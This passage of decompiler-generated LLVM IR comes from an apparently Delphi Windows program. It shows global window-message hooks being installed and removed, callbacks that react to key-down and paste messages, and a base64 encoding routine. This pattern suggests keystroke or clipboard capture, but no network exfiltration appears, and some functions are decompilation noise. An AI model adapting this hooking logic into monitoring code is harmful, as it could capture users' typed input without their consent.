  %10 = icmp eq i1 %9, false, !insn.addr !708
  br i1 %10, label %dec_label_pc_40520f, label %dec_label_pc_4051ec, !insn.addr !709

dec_label_pc_4051ec:                              ; preds = %dec_label_pc_4051d1
  %11 = call i32 @function_406f9c(), !insn.addr !710
  %12 = call i32 @"@LStrAsg"(), !insn.addr !711
  %13 = call i32 @function_4072c4(), !insn.addr !712
  store i32 %8, i32* %esp.0.reg2mem, !insn.addr !713
  br label %dec_label_pc_405214, !insn.addr !713

dec_label_pc_40520f:                              ; preds = %dec_label_pc_4051d1
  %14 = call i32 @function_4073f8(), !insn.addr !714
  store i32 %8, i32* %esp.0.reg2mem, !insn.addr !714
  br label %dec_label_pc_405214, !insn.addr !714

dec_label_pc_405214:                              ; preds = %dec_label_pc_40520f, %dec_label_pc_4051ec, %dec_label_pc_4051b0
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %15 = inttoptr i32 %esp.0.reload to i32*, !insn.addr !715
  %16 = load i32, i32* %15, align 4, !insn.addr !715
  call void @__writefsdword(i32 0, i32 %16), !insn.addr !716
  %17 = add i32 %esp.0.reload, 8, !insn.addr !717
  %18 = inttoptr i32 %17 to i32*, !insn.addr !717
  store i32 4215345, i32* %18, align 4, !insn.addr !717
  %19 = call i32 @"@LStrClr"(), !insn.addr !718
  ret i32 %19, !insn.addr !719
}

define i32 @function_40522a() local_unnamed_addr {
dec_label_pc_40522a:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !720
  ret i32 %0, !insn.addr !720
}

define i32 @function_40522f() local_unnamed_addr {
dec_label_pc_40522f:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !721
}

define i32 @function_405231(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_405231:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !722
}

define i32 @function_405235() local_unnamed_addr {
dec_label_pc_405235:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %4 = call i32 @__decompiler_undefined_function_0()
  %5 = bitcast i32* %eax to i8*
  %6 = trunc i32 %4 to i8
  %7 = mul i8 %6, 2, !insn.addr !723
  %8 = inttoptr i32 %4 to i8*, !insn.addr !723
  store i8 %7, i8* %8, align 1, !insn.addr !723
  %9 = add i32 %2, 111, !insn.addr !724
  %10 = inttoptr i32 %9 to i8*, !insn.addr !724
  %11 = load i8, i8* %10, align 1, !insn.addr !724
  %12 = load i32, i32* %eax, align 4, !insn.addr !724
  %13 = trunc i32 %12 to i8, !insn.addr !724
  %14 = add i8 %11, %13, !insn.addr !724
  store i8 %14, i8* %10, align 1, !insn.addr !724
  %15 = trunc i32 %3 to i16, !insn.addr !725
  %16 = call i32 @__asm_insd(i16 %15), !insn.addr !725
  %17 = inttoptr i32 %0 to i32*, !insn.addr !725
  store i32 %16, i32* %17, align 4, !insn.addr !725
  %18 = add i32 %0, 66, !insn.addr !726
  %19 = inttoptr i32 %18 to i64*, !insn.addr !726
  %20 = load i64, i64* %19, align 4, !insn.addr !726
  %21 = call i32 @__asm_bound(i64 %20), !insn.addr !726
  call void @__asm_outsd(i16 %15, i32 %1), !insn.addr !727
  %22 = load i8, i8* %5, align 4, !insn.addr !728
  %23 = load i32, i32* %eax, align 4
  %24 = trunc i32 %23 to i8, !insn.addr !728
  %25 = add i8 %22, %24, !insn.addr !728
  %26 = inttoptr i32 %23 to i8*, !insn.addr !728
  store i8 %25, i8* %26, align 1, !insn.addr !728
  %27 = add i32 %21, -117, !insn.addr !729
  %28 = inttoptr i32 %27 to i8*, !insn.addr !729
  %29 = load i8, i8* %28, align 1, !insn.addr !729
  %30 = trunc i32 %3 to i8, !insn.addr !729
  %31 = add i8 %29, %30, !insn.addr !729
  store i8 %31, i8* %28, align 1, !insn.addr !729
  %32 = call i8 @__asm_in(i16 %15), !insn.addr !730
  %33 = add i32 %21, 16, !insn.addr !731
  %34 = inttoptr i32 %33 to i32*, !insn.addr !731
  %35 = load i32, i32* %34, align 4, !insn.addr !731
  %36 = add i32 %21, 12, !insn.addr !732
  %37 = inttoptr i32 %36 to i32*, !insn.addr !732
  %38 = load i32, i32* %37, align 4, !insn.addr !732
  %39 = add i32 %21, 8, !insn.addr !733
  %40 = inttoptr i32 %39 to i32*, !insn.addr !733
  %41 = load i32, i32* %40, align 4, !insn.addr !733
  %42 = load i32, i32* inttoptr (i32 4227372 to i32*), align 4, !insn.addr !734
  %43 = inttoptr i32 %42 to i32*, !insn.addr !735
  %44 = load i32, i32* %43, align 4, !insn.addr !735
  %45 = icmp eq i32 %44, 0, !insn.addr !735
  %46 = icmp eq i1 %45, false, !insn.addr !736
  %47 = icmp eq i32 %41, 0, !insn.addr !737
  %48 = icmp eq i1 %47, %46
  %49 = icmp eq i32 %38, 1, !insn.addr !738
  %50 = icmp eq i1 %49, %48
  br i1 %50, label %dec_label_pc_40526b, label %dec_label_pc_40529a, !insn.addr !739

dec_label_pc_40526b:                              ; preds = %dec_label_pc_405235
  store i32 %35, i32* %eax, align 4, !insn.addr !740
  %51 = add i32 %35, 4, !insn.addr !741
  %52 = inttoptr i32 %51 to i32*, !insn.addr !741
  %53 = load i32, i32* %52, align 4, !insn.addr !741
  switch i32 %53, label %dec_label_pc_40529a [
    i32 256, label %dec_label_pc_405282
    i32 770, label %dec_label_pc_405293
  ]

dec_label_pc_405282:                              ; preds = %dec_label_pc_40526b
  %54 = call i32 @function_404fc0(i32 %2, i32 %1, i32 %0), !insn.addr !742
  br label %dec_label_pc_40529a, !insn.addr !743

dec_label_pc_405293:                              ; preds = %dec_label_pc_40526b
  %55 = call i32 @function_4050e4(i32 %2, i32 %1, i32 %0), !insn.addr !744
  br label %dec_label_pc_40529a, !insn.addr !744

dec_label_pc_40529a:                              ; preds = %dec_label_pc_405235, %dec_label_pc_40526b, %dec_label_pc_405293, %dec_label_pc_405282
  %56 = load i32, i32* @global_var_4096ac, align 4, !insn.addr !745
  %57 = inttoptr i32 %35 to i32*, !insn.addr !746
  %58 = call i32 @CallNextHookEx(i32* %57, i32 %38, i32 %41, i32 %56), !insn.addr !746
  ret i32 %58, !insn.addr !747
}

define i32 @function_4052b0(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_4052b0:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = load i32, i32* @global_var_40812c, align 4
  %4 = icmp eq i32 %3, 0, !insn.addr !748
  %5 = icmp eq i1 %4, false, !insn.addr !749
  %6 = icmp eq i32 %arg3, 0, !insn.addr !750
  %7 = icmp eq i1 %6, %5
  br i1 %7, label %dec_label_pc_4052ce, label %dec_label_pc_4052e0, !insn.addr !751

dec_label_pc_4052ce:                              ; preds = %dec_label_pc_4052b0
  %8 = add i32 %arg1, 8, !insn.addr !752
  %9 = inttoptr i32 %8 to i32*, !insn.addr !752
  %10 = load i32, i32* %9, align 4, !insn.addr !752
  %11 = icmp eq i32 %10, 2, !insn.addr !753
  %12 = icmp eq i1 %11, false, !insn.addr !754
  br i1 %12, label %dec_label_pc_4052e0, label %dec_label_pc_4052d8, !insn.addr !754

dec_label_pc_4052d8:                              ; preds = %dec_label_pc_4052ce
  %13 = call i32 @function_4051b0(i32 %1, i32 %2, i32 %0), !insn.addr !755
  br label %dec_label_pc_4052e0, !insn.addr !755

dec_label_pc_4052e0:                              ; preds = %dec_label_pc_4052b0, %dec_label_pc_4052d8, %dec_label_pc_4052ce
  %14 = load i32, i32* @global_var_4096b0, align 4, !insn.addr !756
  %15 = inttoptr i32 %arg1 to i32*, !insn.addr !757
  %16 = call i32 @CallNextHookEx(i32* %15, i32 %arg2, i32 %arg3, i32 %14), !insn.addr !757
  ret i32 %16, !insn.addr !758
}

define i32 @function_4052f8() local_unnamed_addr {
dec_label_pc_4052f8:
  %0 = load i32 (i32, i32, i32)*, i32 (i32, i32, i32)** @global_var_409650, align 4
  %1 = call i32* @SetWindowsHookExA(i32 0, i32 (i32, i32, i32)* %0, i32* inttoptr (i32 4215364 to i32*), i32 3), !insn.addr !759
  %2 = ptrtoint i32* %1 to i32, !insn.addr !759
  store i32 %2, i32* @global_var_4096ac, align 4, !insn.addr !760
  %3 = load i32 (i32, i32, i32)*, i32 (i32, i32, i32)** @global_var_409650, align 4
  %4 = call i32* @SetWindowsHookExA(i32 0, i32 (i32, i32, i32)* %3, i32* inttoptr (i32 4215472 to i32*), i32 4), !insn.addr !761
  %5 = ptrtoint i32* %4 to i32, !insn.addr !761
  store i32 %5, i32* @global_var_4096b0, align 4, !insn.addr !762
  ret i32 %5, !insn.addr !763
}

define i32 @function_405330() local_unnamed_addr {
dec_label_pc_405330:
  %0 = load i32, i32* @global_var_4096ac, align 4, !insn.addr !764
  %1 = inttoptr i32 %0 to i32*, !insn.addr !765
  %2 = call i1 @UnhookWindowsHookEx(i32* %1), !insn.addr !765
  %3 = load i32, i32* @global_var_4096b0, align 4, !insn.addr !766
  %4 = inttoptr i32 %3 to i32*, !insn.addr !767
  %5 = call i1 @UnhookWindowsHookEx(i32* %4), !insn.addr !767
  %6 = sext i1 %5 to i32, !insn.addr !767
  ret i32 %6, !insn.addr !768
}

define i32 @function_405348() local_unnamed_addr {
dec_label_pc_405348:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !769
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !769
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !769
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !770
  %2 = load i32, i32* @global_var_4096a8, align 4, !insn.addr !771
  %3 = add i32 %2, 1, !insn.addr !771
  store i32 %3, i32* @global_var_4096a8, align 4, !insn.addr !771
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !772
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !773
  ret i32 0, !insn.addr !774
}

define i32 @function_40536d() local_unnamed_addr {
dec_label_pc_40536d:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !775
  ret i32 %0, !insn.addr !775
}

define i32 @function_405372() local_unnamed_addr {
dec_label_pc_405372:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !776
}

define i32 @function_405374(i32 %arg1) local_unnamed_addr {
dec_label_pc_405374:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !777
}

define i32 @function_405378() local_unnamed_addr {
dec_label_pc_405378:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096a8, align 4, !insn.addr !778
  %2 = add i32 %1, -1, !insn.addr !778
  store i32 %2, i32* @global_var_4096a8, align 4, !insn.addr !778
  ret i32 %0, !insn.addr !779
}

define i32 @function_405383(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_405383:
  %storemerge.reg2mem = alloca i32, !insn.addr !780
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %4 = add i32 %3, 1, !insn.addr !780
  %5 = inttoptr i32 %3 to i32*, !insn.addr !780
  store i32 %4, i32* %5, align 4, !insn.addr !780
  %6 = bitcast i32* %eax to i8*
  %7 = load i8, i8* %6, align 4, !insn.addr !781
  %8 = load i32, i32* %eax, align 4
  %9 = trunc i32 %8 to i8, !insn.addr !781
  %10 = add i8 %7, %9, !insn.addr !781
  %11 = inttoptr i32 %8 to i8*, !insn.addr !781
  store i8 %10, i8* %11, align 1, !insn.addr !781
  %12 = load i32, i32* %eax, align 4, !insn.addr !782
  store i32 %arg1, i32* %eax, align 4, !insn.addr !783
  %13 = add i32 %12, 99, !insn.addr !784
  %14 = inttoptr i32 %13 to i64*, !insn.addr !784
  %15 = load i64, i64* %14, align 4, !insn.addr !784
  %16 = call i32 @__asm_bound(i64 %15), !insn.addr !784
  %17 = add i32 %16, -2, !insn.addr !785
  %18 = inttoptr i32 %17 to i16*, !insn.addr !785
  store i16 27241, i16* %18, align 2, !insn.addr !785
  %19 = mul i32 %2, 2, !insn.addr !786
  %20 = add i32 %2, 110, !insn.addr !786
  %21 = add i32 %20, %19, !insn.addr !786
  %22 = inttoptr i32 %21 to i32*, !insn.addr !786
  %23 = load i32, i32* %22, align 4, !insn.addr !786
  %24 = sext i32 %23 to i64, !insn.addr !786
  %25 = mul nsw i64 %24, 111, !insn.addr !786
  %26 = mul i64 %24, 476741369856
  %27 = sdiv i64 %26, 4294967296, !insn.addr !786
  %28 = icmp eq i64 %25, %27, !insn.addr !786
  br i1 %28, label %dec_label_pc_4053b5, label %dec_label_pc_405424, !insn.addr !787

dec_label_pc_4053b5:                              ; preds = %dec_label_pc_405383
  %29 = icmp eq i32 %0, 0, !insn.addr !788
  br i1 %29, label %dec_label_pc_40542c, label %dec_label_pc_4053b9, !insn.addr !789

dec_label_pc_4053b9:                              ; preds = %dec_label_pc_4053b5
  %30 = icmp slt i32 %0, 0, !insn.addr !788
  br i1 %30, label %dec_label_pc_405434, label %dec_label_pc_4053bb, !insn.addr !790

dec_label_pc_4053bb:                              ; preds = %dec_label_pc_4053b9
  %31 = trunc i32 %0 to i8, !insn.addr !788
  %32 = call i8 @llvm.ctpop.i8(i8 %31), !range !535, !insn.addr !788
  %33 = and i8 %32, 1, !insn.addr !788
  %34 = icmp eq i8 %33, 0, !insn.addr !788
  br i1 %34, label %dec_label_pc_4053ed, label %dec_label_pc_4053bd, !insn.addr !791

dec_label_pc_4053bd:                              ; preds = %dec_label_pc_4053bb
  %35 = add i32 %12, -1, !insn.addr !782
  %36 = inttoptr i32 %arg3 to i32*, !insn.addr !792
  %37 = load i32, i32* %36, align 4, !insn.addr !792
  %38 = xor i32 %37, %1, !insn.addr !792
  store i32 %38, i32* %36, align 4, !insn.addr !792
  %39 = add i32 %1, 959985462, !insn.addr !793
  %40 = inttoptr i32 %39 to i32*, !insn.addr !793
  %41 = load i32, i32* %40, align 4, !insn.addr !793
  %42 = xor i32 %41, %1, !insn.addr !793
  %43 = add i32 %16, -38, !insn.addr !794
  %44 = inttoptr i32 %43 to i32*, !insn.addr !794
  store i32 %35, i32* %44, align 4, !insn.addr !794
  %45 = add i32 %16, -42, !insn.addr !795
  %46 = inttoptr i32 %45 to i32*, !insn.addr !795
  store i32 %42, i32* %46, align 4, !insn.addr !795
  %47 = add i32 %16, -22, !insn.addr !796
  %48 = inttoptr i32 %47 to i32*, !insn.addr !796
  store i32 0, i32* %48, align 4, !insn.addr !796
  %49 = add i32 %16, -26, !insn.addr !797
  %50 = inttoptr i32 %49 to i32*, !insn.addr !797
  store i32 0, i32* %50, align 4, !insn.addr !797
  %51 = add i32 %16, -30, !insn.addr !798
  %52 = inttoptr i32 %51 to i32*, !insn.addr !798
  store i32 0, i32* %52, align 4, !insn.addr !798
  %53 = add i32 %16, -34, !insn.addr !799
  %54 = inttoptr i32 %53 to i32*, !insn.addr !799
  store i32 0, i32* %54, align 4, !insn.addr !799
  %55 = add i32 %16, -6, !insn.addr !800
  %56 = inttoptr i32 %55 to i32*, !insn.addr !800
  store i32 %arg3, i32* %56, align 4, !insn.addr !800
  %57 = add i32 %16, -46, !insn.addr !801
  %58 = inttoptr i32 %57 to i32*, !insn.addr !801
  store i32 %17, i32* %58, align 4, !insn.addr !801
  ret i32 0, !insn.addr !801

dec_label_pc_4053ed:                              ; preds = %dec_label_pc_4053bb
  %59 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !802
  %60 = trunc i64 %25 to i32, !insn.addr !786
  %61 = load i32, i32* %eax, align 4, !insn.addr !803
  %62 = add i32 %61, 1, !insn.addr !803
  %63 = mul i32 %59, 8, !insn.addr !804
  %64 = add i32 %59, 48, !insn.addr !804
  %65 = add i32 %64, %63, !insn.addr !804
  %66 = inttoptr i32 %65 to i8*, !insn.addr !804
  %67 = load i8, i8* %66, align 4, !insn.addr !804
  %68 = udiv i32 %62, 256, !insn.addr !804
  %69 = trunc i32 %68 to i8, !insn.addr !804
  %70 = add i8 %67, %69, !insn.addr !804
  store i8 %70, i8* %66, align 4, !insn.addr !804
  call void @__writefsdword(i32 %62, i32 %17), !insn.addr !805
  %71 = call i32 @"@LStrClr"(), !insn.addr !806
  %72 = call i32 @function_4034c8(), !insn.addr !807
  %73 = add i32 %60, -8, !insn.addr !808
  %74 = inttoptr i32 %73 to i32*, !insn.addr !808
  store i32 %72, i32* %74, align 4, !insn.addr !808
  %75 = ashr i32 %72, 31, !insn.addr !809
  %76 = zext i32 %72 to i64, !insn.addr !810
  %77 = zext i32 %75 to i64, !insn.addr !810
  %78 = mul i64 %77, 4294967296, !insn.addr !810
  %79 = or i64 %78, %76, !insn.addr !810
  %80 = sdiv i64 %79, 3, !insn.addr !810
  %81 = trunc i64 %80 to i32, !insn.addr !810
  store i32 %81, i32* %eax, align 4, !insn.addr !810
  %82 = srem i64 %79, 3, !insn.addr !810
  %83 = trunc i64 %82 to i32, !insn.addr !810
  %84 = icmp eq i32 %83, 0, !insn.addr !811
  %85 = icmp eq i1 %84, false, !insn.addr !812
  br i1 %85, label %dec_label_pc_405423, label %dec_label_pc_405416, !insn.addr !812

dec_label_pc_405416:                              ; preds = %dec_label_pc_4053ed
  %86 = load i32, i32* %74, align 4, !insn.addr !813
  %87 = ashr i32 %86, 31, !insn.addr !814
  %88 = zext i32 %86 to i64, !insn.addr !815
  %89 = zext i32 %87 to i64, !insn.addr !815
  %90 = mul i64 %89, 4294967296, !insn.addr !815
  %91 = or i64 %90, %88, !insn.addr !815
  %92 = sdiv i64 %91, 3, !insn.addr !815
  %93 = trunc i64 %92 to i32, !insn.addr !815
  store i32 %93, i32* %storemerge.reg2mem, !insn.addr !816
  br label %dec_label_pc_405430, !insn.addr !816

dec_label_pc_405423:                              ; preds = %dec_label_pc_4053ed
  ret i32 %81, !insn.addr !816

dec_label_pc_405424:                              ; preds = %dec_label_pc_405383
  %94 = load i32, i32* %eax, align 4, !insn.addr !817
  ret i32 %94, !insn.addr !817

dec_label_pc_40542c:                              ; preds = %dec_label_pc_4053b5
  %95 = load i32, i32* %eax, align 4, !insn.addr !818
  %96 = zext i32 %95 to i64, !insn.addr !818
  %97 = zext i32 %arg3 to i64, !insn.addr !818
  %98 = mul i64 %97, 4294967296, !insn.addr !818
  %99 = or i64 %98, %96, !insn.addr !818
  %100 = zext i32 %arg2 to i64, !insn.addr !818
  %101 = sdiv i64 %99, %100, !insn.addr !818
  %102 = trunc i64 %101 to i32, !insn.addr !818
  %103 = add i32 %102, 1, !insn.addr !819
  store i32 %103, i32* %storemerge.reg2mem, !insn.addr !819
  br label %dec_label_pc_405430, !insn.addr !819

dec_label_pc_405430:                              ; preds = %dec_label_pc_405416, %dec_label_pc_40542c
  %storemerge.reload = load i32, i32* %storemerge.reg2mem
  %104 = add i32 %storemerge.reload, -1, !insn.addr !820
  ret i32 %104, !insn.addr !821

dec_label_pc_405434:                              ; preds = %dec_label_pc_4053b9
  %105 = inttoptr i32 %1 to i32*, !insn.addr !822
  %106 = load i32, i32* %105, align 4, !insn.addr !822
  store i32 %106, i32* %stack_var_-16, align 4, !insn.addr !822
  %107 = load i32, i32* %eax, align 4
  %108 = inttoptr i32 %107 to i32*, !insn.addr !823
  %109 = load i32, i32* %108, align 4, !insn.addr !823
  %110 = add i32 %109, %107, !insn.addr !823
  store i32 %110, i32* %108, align 4, !insn.addr !823
  %111 = load i32, i32* %eax, align 4
  %112 = add i32 %111, -119, !insn.addr !824
  %113 = inttoptr i32 %112 to i8*, !insn.addr !824
  %114 = load i8, i8* %113, align 1, !insn.addr !824
  %115 = trunc i32 %111 to i8, !insn.addr !824
  %116 = add i8 %114, %115, !insn.addr !824
  store i8 %116, i8* %113, align 1, !insn.addr !824
  %117 = load i32, i32* %eax, align 4, !insn.addr !825
  ret i32 %117, !insn.addr !825
}

define i32 @function_40543c() local_unnamed_addr {
dec_label_pc_40543c:
  %ebx.0.reg2mem = alloca i32, !insn.addr !826
  %esp.0.reg2mem = alloca i32, !insn.addr !826
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = add i32 %1, -8, !insn.addr !827
  %3 = inttoptr i32 %2 to i32*, !insn.addr !827
  %4 = add i32 %1, -9
  %5 = inttoptr i32 %4 to i8*
  %6 = add i32 %1, -10
  %7 = inttoptr i32 %6 to i8*
  %8 = add i32 %1, -11
  %9 = inttoptr i32 %8 to i8*
  %10 = add i32 %1, -12
  %11 = inttoptr i32 %10 to i8*
  %12 = add i32 %1, -4, !insn.addr !828
  %13 = inttoptr i32 %12 to i32*, !insn.addr !828
  %14 = add i32 %1, -20
  %15 = inttoptr i32 %14 to i32*
  %16 = add i32 %1, -24
  %17 = inttoptr i32 %16 to i32*
  %18 = add i32 %1, -28
  %19 = inttoptr i32 %18 to i32*
  %20 = add i32 %1, -32
  %21 = inttoptr i32 %20 to i32*
  %22 = add i32 %1, -16
  %23 = inttoptr i32 %22 to i32*
  store i32 0, i32* %ebx.0.reg2mem, !insn.addr !826
  br label %dec_label_pc_40543e, !insn.addr !826

dec_label_pc_40543e:                              ; preds = %dec_label_pc_405589, %dec_label_pc_40543c
  %ebx.0.reload = load i32, i32* %ebx.0.reg2mem
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %24 = mul i32 %ebx.0.reload, 3, !insn.addr !829
  %25 = add i32 %24, 3, !insn.addr !830
  %26 = load i32, i32* %3, align 4, !insn.addr !827
  %27 = icmp sgt i32 %25, %26, !insn.addr !831
  br i1 %27, label %dec_label_pc_4054de, label %dec_label_pc_40544f, !insn.addr !831

dec_label_pc_40544f:                              ; preds = %dec_label_pc_40543e
  %28 = add i32 %24, %0, !insn.addr !832
  %29 = inttoptr i32 %28 to i8*, !insn.addr !832
  %30 = load i8, i8* %29, align 1, !insn.addr !832
  %31 = udiv i8 %30, 4
  %32 = zext i8 %31 to i32, !insn.addr !833
  %33 = add i32 %32, ptrtoint ([64 x i8]* @B64EncodeTable_at_405388 to i32), !insn.addr !834
  %34 = inttoptr i32 %33 to i8*, !insn.addr !834
  %35 = load i8, i8* %34, align 1, !insn.addr !834
  store i8 %35, i8* %5, align 1, !insn.addr !835
  %36 = load i8, i8* %29, align 1, !insn.addr !836
  %37 = mul i8 %36, 16, !insn.addr !837
  %38 = and i8 %37, 48, !insn.addr !838
  %39 = add i32 %28, 1, !insn.addr !839
  %40 = inttoptr i32 %39 to i8*, !insn.addr !839
  %41 = load i8, i8* %40, align 1, !insn.addr !839
  %42 = udiv i8 %41, 16
  %43 = or i8 %42, %38, !insn.addr !840
  %44 = zext i8 %43 to i32, !insn.addr !840
  %45 = add i32 %44, ptrtoint ([64 x i8]* @B64EncodeTable_at_405388 to i32), !insn.addr !841
  %46 = inttoptr i32 %45 to i8*, !insn.addr !841
  %47 = load i8, i8* %46, align 1, !insn.addr !841
  store i8 %47, i8* %7, align 1, !insn.addr !842
  %48 = load i8, i8* %40, align 1, !insn.addr !843
  %49 = mul i8 %48, 4, !insn.addr !844
  %50 = and i8 %49, 60, !insn.addr !845
  %51 = add i32 %28, 2, !insn.addr !846
  %52 = inttoptr i32 %51 to i8*, !insn.addr !846
  %53 = load i8, i8* %52, align 1, !insn.addr !846
  %54 = udiv i8 %53, 64, !insn.addr !847
  %55 = or i8 %54, %50, !insn.addr !848
  %56 = zext i8 %55 to i32, !insn.addr !848
  %57 = add i32 %56, ptrtoint ([64 x i8]* @B64EncodeTable_at_405388 to i32), !insn.addr !849
  %58 = inttoptr i32 %57 to i8*, !insn.addr !849
  %59 = load i8, i8* %58, align 1, !insn.addr !849
  store i8 %59, i8* %9, align 1, !insn.addr !850
  %60 = and i8 %53, 63, !insn.addr !851
  %61 = zext i8 %60 to i32, !insn.addr !851
  %62 = add i32 %61, ptrtoint ([64 x i8]* @B64EncodeTable_at_405388 to i32), !insn.addr !852
  %63 = inttoptr i32 %62 to i8*, !insn.addr !852
  %64 = load i8, i8* %63, align 1, !insn.addr !852
  store i8 %64, i8* %11, align 1, !insn.addr !853
  br label %dec_label_pc_405589, !insn.addr !854

dec_label_pc_4054de:                              ; preds = %dec_label_pc_40543e
  %65 = add i32 %24, 2, !insn.addr !855
  %66 = icmp sgt i32 %65, %26, !insn.addr !856
  %67 = add i32 %24, %0
  %68 = inttoptr i32 %67 to i8*
  %69 = load i8, i8* %68, align 1
  %70 = udiv i8 %69, 4
  %71 = zext i8 %70 to i32
  %72 = add i32 %71, ptrtoint ([64 x i8]* @B64EncodeTable_at_405388 to i32)
  %73 = inttoptr i32 %72 to i8*
  %74 = load i8, i8* %73, align 1
  store i8 %74, i8* %5, align 1
  %75 = load i8, i8* %68, align 1
  br i1 %66, label %dec_label_pc_40554d, label %dec_label_pc_4054e8, !insn.addr !856

dec_label_pc_4054e8:                              ; preds = %dec_label_pc_4054de
  %76 = mul i8 %75, 16, !insn.addr !857
  %77 = and i8 %76, 48, !insn.addr !858
  %78 = add i32 %67, 1, !insn.addr !859
  %79 = inttoptr i32 %78 to i8*, !insn.addr !859
  %80 = load i8, i8* %79, align 1, !insn.addr !859
  %81 = zext i8 %80 to i32, !insn.addr !859
  %82 = udiv i8 %80, 16, !insn.addr !860
  %83 = or i8 %82, %77, !insn.addr !861
  %84 = zext i8 %83 to i32, !insn.addr !861
  %85 = add i32 %84, ptrtoint ([64 x i8]* @B64EncodeTable_at_405388 to i32), !insn.addr !862
  %86 = inttoptr i32 %85 to i8*, !insn.addr !862
  %87 = load i8, i8* %86, align 1, !insn.addr !862
  store i8 %87, i8* %7, align 1, !insn.addr !863
  %88 = mul i32 %81, 4, !insn.addr !864
  %89 = and i32 %88, 60, !insn.addr !865
  %90 = add i32 %89, ptrtoint ([64 x i8]* @B64EncodeTable_at_405388 to i32), !insn.addr !866
  %91 = inttoptr i32 %90 to i8*, !insn.addr !866
  %92 = load i8, i8* %91, align 4, !insn.addr !866
  store i8 %92, i8* %9, align 1, !insn.addr !867
  store i8 61, i8* %11, align 1, !insn.addr !868
  br label %dec_label_pc_405589, !insn.addr !869

dec_label_pc_40554d:                              ; preds = %dec_label_pc_4054de
  %93 = zext i8 %75 to i32, !insn.addr !870
  %94 = mul i32 %93, 16, !insn.addr !871
  %95 = and i32 %94, 48, !insn.addr !872
  %96 = add i32 %95, ptrtoint ([64 x i8]* @B64EncodeTable_at_405388 to i32), !insn.addr !873
  %97 = inttoptr i32 %96 to i8*, !insn.addr !873
  %98 = load i8, i8* %97, align 16, !insn.addr !873
  store i8 %98, i8* %7, align 1, !insn.addr !874
  store i8 61, i8* %9, align 1, !insn.addr !875
  store i8 61, i8* %11, align 1, !insn.addr !876
  br label %dec_label_pc_405589, !insn.addr !876

dec_label_pc_405589:                              ; preds = %dec_label_pc_40554d, %dec_label_pc_4054e8, %dec_label_pc_40544f
  %99 = load i32, i32* %13, align 4, !insn.addr !828
  %100 = inttoptr i32 %99 to i32*, !insn.addr !877
  %101 = load i32, i32* %100, align 4, !insn.addr !877
  %102 = add i32 %esp.0.reload, -4, !insn.addr !877
  %103 = inttoptr i32 %102 to i32*, !insn.addr !877
  store i32 %101, i32* %103, align 4, !insn.addr !877
  %104 = call i32 @"@LStrFromChar"(), !insn.addr !878
  %105 = load i32, i32* %15, align 4, !insn.addr !879
  %106 = add i32 %esp.0.reload, -8, !insn.addr !879
  %107 = inttoptr i32 %106 to i32*, !insn.addr !879
  store i32 %105, i32* %107, align 4, !insn.addr !879
  %108 = call i32 @"@LStrFromChar"(), !insn.addr !880
  %109 = load i32, i32* %17, align 4, !insn.addr !881
  %110 = add i32 %esp.0.reload, -12, !insn.addr !881
  %111 = inttoptr i32 %110 to i32*
  store i32 %109, i32* %111, align 4, !insn.addr !881
  %112 = call i32 @"@LStrFromChar"(), !insn.addr !882
  %113 = load i32, i32* %19, align 4, !insn.addr !883
  %114 = add i32 %esp.0.reload, -16, !insn.addr !883
  %115 = inttoptr i32 %114 to i32*, !insn.addr !883
  store i32 %113, i32* %115, align 4, !insn.addr !883
  %116 = call i32 @"@LStrFromChar"(), !insn.addr !884
  %117 = load i32, i32* %21, align 4, !insn.addr !885
  %118 = add i32 %esp.0.reload, -20, !insn.addr !885
  %119 = inttoptr i32 %118 to i32*
  store i32 %117, i32* %119, align 4, !insn.addr !885
  %120 = call i32 @"@LStrCatN"(), !insn.addr !886
  %121 = add i32 %ebx.0.reload, 1, !insn.addr !887
  %122 = load i32, i32* %23, align 4, !insn.addr !888
  %123 = add i32 %122, -1, !insn.addr !888
  %124 = icmp eq i32 %123, 0, !insn.addr !888
  store i32 %123, i32* %23, align 4, !insn.addr !888
  %125 = icmp eq i1 %124, false, !insn.addr !889
  store i32 %118, i32* %esp.0.reg2mem, !insn.addr !889
  store i32 %121, i32* %ebx.0.reg2mem, !insn.addr !889
  br i1 %125, label %dec_label_pc_40543e, label %dec_label_pc_4055dd, !insn.addr !889

dec_label_pc_4055dd:                              ; preds = %dec_label_pc_405589
  %126 = load i32, i32* %119, align 4, !insn.addr !890
  call void @__writefsdword(i32 0, i32 %126), !insn.addr !891
  store i32 4216319, i32* %111, align 4, !insn.addr !892
  %127 = call i32 @"@LStrArrayClr"(), !insn.addr !893
  ret i32 %127, !insn.addr !894
}

define i32 @function_4055f8() local_unnamed_addr {
dec_label_pc_4055f8:
